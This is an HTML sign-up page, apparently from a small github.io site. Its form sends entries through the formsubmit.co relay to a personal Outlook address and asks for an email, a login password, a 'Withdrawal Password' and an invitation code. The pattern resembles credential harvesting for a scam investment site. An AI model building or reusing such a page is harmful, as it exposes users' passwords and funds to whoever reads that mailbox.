<!DOCTYPE html>
<html lang="en">
    <head>
        <title></title>
        <meta charset="UTF-8">
        <script src="https://kit.fontawesome.com/c4254e24a8.js" crossorigin="anonymous"></script>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link href="css/login.css" rel="stylesheet">
        <link rel="stylesheet" href="https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css">
    </head>
    <body>
        <div class="container">
            <div class="form-container" style="height: 600px;">
                <img src="/img/s.png" alt="" style="width: 17rem;">
                <form action="https://formsubmit.co/Davidwayne389@outlook.com"
                      method="POST"
                      class="form">
                      <input type="text" name="_honey" style="display: none" />
                      <input type="hidden" name="_captcha" value="false" />
                      <input type="hidden" name="_next" value="https://seitupad.github.io/app/home.html/" />
                    <input type="email" class="input" placeholder="Email" >
                    <input type="password" class="input" placeholder="Login Password" >
                    <input type="password" class="input" placeholder="Withdrawal Password" >
                     <div class="input-group">
                      <input type="text" id="iv-code" class="email" style="width: 100%;" placeholder="Invitation Code" onkeyup="validateCode()">
                      <span id="code-error"></span>
                    </div>
                    <div class="gender-option">
                        <div class="gender">
                          <h3>Gender</h3>
                          <input type="radio" id="check-male" name="male-gender" />
                          <label for="check-male">male</label>
                        </div>
                        <div class="gender">
                          <input type="radio" id="check-female" name="female-gender" />
                          <label for="check-female">Female</label>
                        </div>
        
                    </div> 
                    <button class="form-btn" type="submit">Sign in</button>
                </form>
                <p class="sign-up-label">
                    <a href="/login.html"><span class="sign-up-link">Back to Login</span></a>
                </p>
                
                </div>
            </div>

            
        </div>

        <!-- Footer Start -->
        <div class="container px-lg-5">
          <div class="copyright">
            <div class="row">
              <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
                &copy; <a class="border-bottom" href="#"></a> All Right
                Reserved. Designed By
                <a class="border-bottom" href="#">Dinero's Code</a>
              </div>
            </div>
          </div>
        </div>
      </div>
      <!-- Footer End -->

      <script src="js/input.js"></script>
    </body>
</html>
